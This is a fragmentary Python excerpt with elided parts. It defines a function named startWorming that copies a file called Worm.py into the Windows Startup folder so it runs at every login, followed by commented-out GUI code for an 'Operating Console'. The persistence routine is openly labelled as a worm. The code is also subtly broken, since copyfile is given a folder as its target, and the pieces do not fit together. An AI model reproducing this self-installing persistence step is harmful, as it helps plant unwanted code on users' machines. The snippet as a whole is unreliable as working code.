...
from os import path
import shutil
# 'C:\Users\prath\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

def startWorming():
    rd = path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    cd = os.getcwd()
    shutil.copyfile(path.join(cd, 'Worm.py'), rd)
...
#
#         headTitle = Label(headFrame, text='Operating Console', font=('goudy old style', 20), bg='#043256',
#                          fg='white')
#         headTitle.place(x=0, y=0, relwidth=1)
#
#         # ========Execution Frame========
